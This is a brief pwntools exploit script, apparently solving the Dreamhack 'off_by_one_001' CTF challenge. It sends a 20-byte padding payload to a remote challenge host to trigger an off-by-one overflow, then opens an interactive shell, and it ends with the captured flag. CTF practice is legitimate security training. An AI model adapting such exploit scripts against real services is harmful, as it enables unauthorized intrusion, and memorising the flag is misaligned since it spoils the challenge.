from pwn import * 

p = remote("host1.dreamhack.games",8482)
# p = process("./off_by_one_001")

get_shell = 0x08048641

payload1 = ""
payload1 += "a"*20


pause()
p.sendlineafter("Name",payload1)

# payload2 = ""
# payload2 += "a"*20

# p.sendlineafter("cahnce:",payload2)



p.interactive()
# DH{343bab3ef81db6f26ee5f1362942cd79}